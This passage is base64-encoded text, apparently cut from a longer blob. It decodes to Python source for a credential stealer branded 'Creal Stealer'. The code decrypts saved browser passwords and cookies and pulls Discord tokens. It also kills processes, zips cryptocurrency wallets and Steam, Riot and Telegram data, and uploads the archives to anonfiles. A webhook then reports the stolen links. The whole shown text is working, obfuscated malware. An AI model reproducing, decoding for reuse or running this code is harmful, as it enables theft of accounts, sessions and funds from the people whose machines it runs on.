AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUMGszbnMgKz0gdDBrM24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsMDVkVDRrMzEodDBrM24sIHBhdGgpCgogICAgUDRzc3cgPSBbXQogICAgZGVmIGdldFA0c3N3KHBhdGgsIGFyZyk6CiAgICAgICAgZ2xvYmFsIFA0c3N3LCBQNHNzd0NvdW50CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCgogICAgICAgIHRlbXBmb2xkID0gdGVtcCArICJjciIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgICAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgICAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkKICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkKCiAgICAgICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgICAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICAgICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICAgICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICAgICAgaWYgcm93WzBdICE9ICcnOgogICAgICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOgogICAgICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gcGFzd1dvcmRzOiBwYXN3V29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgICAgIFA0c3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0Qza3J5cHRWNGxVMyhyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgICAgICBQNHNzd0NvdW50ICs9IDEKICAgICAgICB3cjF0ZWYwcmYxbDMoUDRzc3csICdwYXNzdycpCgogICAgQzAwazEzID0gW10gICAgCiAgICBkZWYgZ2V0QzAwazEzKHBhdGgsIGFyZyk6CiAgICAgICAgZ2xvYmFsIEMwMGsxMywgQ29va2lDb3VudAogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCiAgICAgICAgCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuCiAgICAgICAgCiAgICAgICAgdGVtcGZvbGQgPSB0ZW1wICsgImNyIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICAgICAgCiAgICAgICAgc2h1dGlsLmNvcHkyKHBhdGhDLCB0ZW1wZm9sZCkKICAgICAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICAgICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMiKQogICAgICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgICAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgICAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmb3Igd2EgaW4ga2V5d29yZDoKICAgICAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhCiAgICAgICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBjb29raVdvcmRzOiBjb29raVdvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgICAgICBDMDBrMTMuYXBwZW5kKGYie3Jvd1swXX0JVFJVRQkvCUZBTFNFCTI1OTc1NzM0NTYJe3Jvd1sxXX0Je0Qza3J5cHRWNGxVMyhyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgICAgICBDb29raUNvdW50ICs9IDEKICAgICAgICB3cjF0ZWYwcmYxbDMoQzAwazEzLCAnY29vaycpCgogICAgZGVmIEczdEQxc2MwcmQocGF0aCwgYXJnKToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZiJ7cGF0aH0vTG9jYWwgU3RhdGUiKTogcmV0dXJuCgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgICAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICAgICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQogICAgICAgICMgcHJpbnQocGF0aCwgbWFzdGVyX2tleSkKICAgICAgICAKICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICAgICAgIyBwcmludChwYXRoLCBmaWxlKQogICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgIGZvciB0MGszbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUMGszbnMKICAgICAgICAgICAgICAgICAgICAgICAgdDBrM25EZWNvZGVkID0gRDNrcnlwdFY0bFUzKGI2NGRlY29kZSh0MGszbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaDFja1Q0azFuKHQwazNuRGVjb2RlZCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdDBrM25EZWNvZGVkIGluIFQwazNuczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFQwazNucyArPSB0MGszbkRlY29kZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbDA1ZFQ0azMxKHQwazNuRGVjb2RlZCwgcGF0aCkKCiAgICBkZWYgR2F0aGVyWmlwcyhwYXRoczEsIHBhdGhzMiwgcGF0aHMzKToKICAgICAgICB0aHR0aHQgPSBbXQogICAgICAgIGZvciBwYXR0IGluIHBhdGhzMToKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxcFRoMW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFs1XSwgcGF0dFsxXV0pCiAgICAgICAgICAgIGEuc3RhcnQoKQogICAgICAgICAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgICAgIGZvciBwYXR0IGluIHBhdGhzMjoKICAgICAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVoxcFRoMW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pCiAgICAgICAgICAgIGEuc3RhcnQoKQogICAgICAgICAgICB0aHR0aHQuYXBwZW5kKGEpCiAgICAgICAgCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRlbGVncmFtLCBhcmdzPVtwYXRoczNbMF0sIHBhdGhzM1syXSwgcGF0aHMzWzFdXSkKICAgICAgICBhLnN0YXJ0KCkKICAgICAgICB0aHR0aHQuYXBwZW5kKGEpCgogICAgICAgIGZvciB0aHJlYWQgaW4gdGh0dGh0OiAKICAgICAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgICAgICMgcHJpbnQoV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcCkKCiAgICAgICAgd2FsLCBnYSwgb3QgPSAiIiwnJywnJwogICAgICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICAgICAgd2FsID0gIjpjb2luOiAg4oCiICBXYWxsZXRzXG4iCiAgICAgICAgICAgIGZvciBpIGluIFdhbGxldHNaaXA6CiAgICAgICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoKICAgICAgICAgICAgZ2EgPSAiOnZpZGVvX2dhbWU6ICDigKIgIEdhbWluZzpcbiIKICAgICAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOgogICAgICAgICAgICAgICAgZ2EgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIgogICAgICAgIGlmIG5vdCBsZW4oT3RoZXJaaXApID09IDA6CiAgICAgICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iCiAgICAgICAgICAgIGZvciBpIGluIE90aGVyWmlwOgogICAgICAgICAgICAgICAgb3QgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIiAgICAgICAgICAKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgImNvbnRlbnQiOiBnbG9iYWxJbmZvKCksCiAgICAgICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAidGl0bGUiOiAiQ3JlYWwgWmlwcyIsCiAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmInt3YWx9XG57Z2F9XG57b3R9IiwKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciLAogICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgIH0KICAgICAgICBMMDRkdXJsMWIodGVsbmV0LCBkYXRhPWpzb24uZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCgogICAgZGVmIFppcFRlbGVncmFtKHBhdGgsIGFyZywgcHJvY2MpOgogICAgICAgIGdsb2JhbCBPdGhlclppcAogICAgICAgIHBhdGhDID0gcGF0aAogICAgICAgIG5hbWUgPSBhcmcKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4KICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YgPm51bCAyPiYxIiwgc2hlbGw9VHJ1ZSkKCiAgICAgICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQogICAgICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOgogICAgICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGUgYW5kIG5vdCAidGR1bW15IiBpbiBmaWxlIGFuZCBub3QgInVzZXJfZGF0YSIgaW4gZmlsZSBhbmQgbm90ICJ3ZWJ2aWV3IiBpbiBmaWxlOiAKICAgICAgICAgICAgICAgIHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkKICAgICAgICB6Zi5jbG9zZSgpCgogICAgICAgIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpCiAgICAgICAgI2xuaWsgPSAiaHR0cHM6Ly9nb29nbGUuY29tIgogICAgICAgIG9zLnJlbW92ZShmIntwYXRoQ30ve25hbWV9LnppcCIpCiAgICAgICAgT3RoZXJaaXAuYXBwZW5kKFthcmcsIGxuaWtdKQoKICAgIGRlZiBaMXBUaDFuZ3MocGF0aCwgYXJnLCBwcm9jYyk6CiAgICAgICAgcGF0aEMgPSBwYXRoCiAgICAgICAgbmFtZSA9IGFyZwogICAgICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwCiAgICAgICAgIyBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgICAgICMgb3Muc3lzdGVtKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiKQoKICAgICAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoKICAgICAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSIKICAgICAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCiAgICAgICAgCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuCiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mID5udWwgMj4mMSIsIHNoZWxsPVRydWUpCgogICAgICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6CiAgICAgICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgICAgICBuYW1lID0gZiJ7YnJvd3Nlcn0iCgogICAgICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikKICAgICAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkKICAgICAgICAgICAgIyBwcmludChkYXRhKQogICAgICAgICAgICBmb3VuZCA9IEZhbHNlCiAgICAgICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOgogICAgICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQogICAgICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgICAgIG5hbWUgPSBhcmcKCgogICAgICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikKICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToKICAgICAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpCiAgICAgICAgemYuY2xvc2UoKQoKICAgICAgICBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7cGF0aEN9L3tuYW1lfS56aXAnKQogICAgICAgICNsbmlrID0gImh0dHBzOi8vZ29vZ2xlLmNvbSIKICAgICAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQoKICAgICAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgImVvZ2FlYW9laGxlZiIgaW4gYXJnOgogICAgICAgICAgICBXYWxsZXRzWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICAgICAgZWxpZiAiTmF0aW9uc0dsb3J5IiBpbiBuYW1lIG9yICJTdGVhbSIgaW4gbmFtZSBvciAiUmlvdENsaSIgaW4gbmFtZToKICAgICAgICAgICAgR2FtaW5nWmlwLmFwcGVuZChbbmFtZSwgbG5pa10pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgT3RoZXJaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkKCgogICAgZGVmIEdhdGhlckFsbCgpOgogICAgICAgICcgICAgICAgICAgICAgICAgICAgRGVmYXVsdCBQYXRoIDwgMCA+ICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc05hbWUgPCAxID4gICAgICAgIFRva2VuICA8IDIgPiAgICAgICAgICAgICAgUGFzc3dvcmQgPCAzID4gICAgIENvb2tpZXMgPCA0ID4gICAgICAgICAgICAgICAgICAgICAgICAgIEV4dGVudGlvbnMgPCA1ID4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJwogICAgICAgIGJyb3dzZXJQYXRocyA9IFsKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIEdYIFN0YWJsZSIsICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIFN0YWJsZSIsICAgICAgICAgICAgICAgICAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie3JvYW1pbmd9L09wZXJhIFNvZnR3YXJlL09wZXJhIE5lb24vVXNlciBEYXRhL0RlZmF1bHQiLCAgIm9wZXJhLmV4ZSIsICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie2xvY2FsfS9Hb29nbGUvQ2hyb21lIFN4Uy9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgImNocm9tZS5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie2xvY2FsfS9CcmF2ZVNvZnR3YXJlL0JyYXZlLUJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgImJyYXZlLmV4ZSIsICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie2xvY2FsfS9ZYW5kZXgvWWFuZGV4QnJvd3Nlci9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgInlhbmRleC5leGUiLCAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0hvdWdhQm91Z2EvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgW2Yie2xvY2FsfS9NaWNyb3NvZnQvRWRnZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgImVkZ2UuZXhlIiwgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdCIsICAgICAiL0RlZmF1bHQvTmV0d29yayIsICAgICAiL0RlZmF1bHQvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgXQogICAgICAgIF0KCiAgICAgICAgZGlzY29yZFBhdGhzID0gWwogICAgICAgICAgICBbZiJ7cm9hbWluZ30vRGlzY29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9MaWdodGNvcmQiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLAogICAgICAgICAgICBbZiJ7cm9hbWluZ30vZGlzY29yZGNhbmFyeSIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkcHRiIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwKICAgICAgICBdCgogICAgICAgIFBhdGhzVG9aaXAgPSBbCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sCiAgICAgICAgICAgIFtmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIsICJFeG9kdXMuZXhlIiwgIldhbGxldCJdLAogICAgICAgICAgICBbIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcU3RlYW1cY29uZmlnIiwgInN0ZWFtLmV4ZSIsICJTdGVhbSJdLAogICAgICAgICAgICBbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICJOYXRpb25zR2xvcnkuZXhlIiwgIk5hdGlvbnNHbG9yeSJdLAogICAgICAgICAgICBbZiJ7bG9jYWx9L1Jpb3QgR2FtZXMvUmlvdCBDbGllbnQvRGF0YSIsICJSaW90Q2xpZW50U2VydmljZXMuZXhlIiwgIlJpb3RDbGllbnQiXQogICAgICAgIF0KICAgICAgICBUZWxlZ3JhbSA9IFtmIntyb2FtaW5nfS9UZWxlZ3JhbSBEZXNrdG9wL3RkYXRhIiwgJ3RlbGVncmFtLmV4ZScsICJUZWxlZ3JhbSJdCgogICAgICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRUMGszbiwgYXJncz1bcGF0dFswXSwgcGF0dFsyXV0pCiAgICAgICAgICAgIGEuc3RhcnQoKQogICAgICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQogICAgICAgIGZvciBwYXR0IGluIGRpc2NvcmRQYXRoczogCiAgICAgICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HM3REMXNjMHJkLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzFdXSkKICAgICAgICAgICAgYS5zdGFydCgpCiAgICAgICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpCgogICAgICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRQNHNzdywgYXJncz1bcGF0dFswXSwgcGF0dFszXV0pCiAgICAgICAgICAgIGEuc3RhcnQoKQogICAgICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQoKICAgICAgICBUaENva2sgPSBbXQogICAgICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogCiAgICAgICAgICAgIGEgPSB0aHJlYWRpbm